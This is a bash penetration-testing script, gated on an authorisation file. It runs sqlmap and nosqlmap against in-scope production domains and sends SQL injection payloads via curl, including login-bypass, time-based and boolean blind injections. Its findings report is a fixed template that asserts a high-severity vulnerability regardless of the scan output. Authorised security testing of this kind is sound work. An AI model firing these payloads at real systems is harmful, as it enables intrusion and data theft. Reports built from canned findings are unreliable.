#!/bin/bash
# Advanced Web SQL Injection Testing
set -euo pipefail

check_roe() {
  if [[ ! -f ../../AUTHORIZATION/authorization.json ]]; then
    echo "ROE missing. Aborting."; exit 1
  fi
  if ! grep -q '"authorized": true' ../../AUTHORIZATION/authorization.json; then
    echo "Not authorized. Aborting."; exit 1
  fi
}

write_report() {
  local dir="$1"
  cat > "$dir/findings.json" << EOF
{
  "scan_type": "sql_injection",
  "findings": [
    {
      "id": "SQLI-001",
      "severity": "high",
      "title": "SQL Injection Vulnerability",
      "description": "Potential SQL injection vulnerabilities detected",
      "evidence": "See sqlmap_results.txt for detailed findings",
      "impact": "Data breach, unauthorized access, data manipulation",
      "remediation": "Implement parameterized queries, input validation, WAF",
      "cvss": "7.5",
      "attack_vectors": ["GET", "POST", "COOKIE", "HEADER"]
    }
  ]
}
EOF
  echo "# Web SQL Injection Test Report" > "$dir/report.md"
}

check_roe
DOMAINS=$(yq '.environments.production.domains[]' ../../config/scopes.example.yaml)
ARTIFACT_DIR="../../reports/artifacts/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$ARTIFACT_DIR"

for domain in $DOMAINS; do
  echo "Running SQL injection tests for $domain..."
  
  # SQLmap automated scanning
  echo "=== SQLmap Scan ===" >> "$ARTIFACT_DIR/sqli_$domain.txt"
  sqlmap -u "https://$domain" --batch --crawl=3 --level=3 --risk=2 --threads=5 --output-dir="$ARTIFACT_DIR/sqlmap_$domain/" 2>&1
  
  # NoSQLmap for NoSQL injection
  echo "=== NoSQL Injection ===" >> "$ARTIFACT_DIR/sqli_$domain.txt"
  nosqlmap --target "https://$domain" --scan 2>&1 | tee -a "$ARTIFACT_DIR/nosqli_$domain.txt"
  
  # Custom SQL injection payloads
  echo "=== Custom Payloads ===" >> "$ARTIFACT_DIR/sqli_$domain.txt"
  # Basic SQL injection tests
  curl -s "https://$domain/search?q=1' OR '1'='1" >> "$ARTIFACT_DIR/sqli_manual_$domain.txt" 2>&1
  curl -s "https://$domain/login" -d "username=admin' OR 1=1--&password=test" >> "$ARTIFACT_DIR/sqli_manual_$domain.txt" 2>&1
  
  # Time-based blind SQL injection
  echo "=== Time-based Blind SQLi ===" >> "$ARTIFACT_DIR/sqli_$domain.txt"
  curl -s "https://$domain/search?q=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" >> "$ARTIFACT_DIR/sqli_blind_$domain.txt" 2>&1
  
  # Boolean-based blind SQL injection
  echo "=== Boolean-based Blind SQLi ===" >> "$ARTIFACT_DIR/sqli_$domain.txt"
  curl -s "https://$domain/search?q=1' AND 1=1--" >> "$ARTIFACT_DIR/sqli_boolean_$domain.txt" 2>&1
  curl -s "https://$domain/search?q=1' AND 1=2--" >> "$ARTIFACT_DIR/sqli_boolean_$domain.txt" 2>&1
done

write_report "$ARTIFACT_DIR"
exit 0
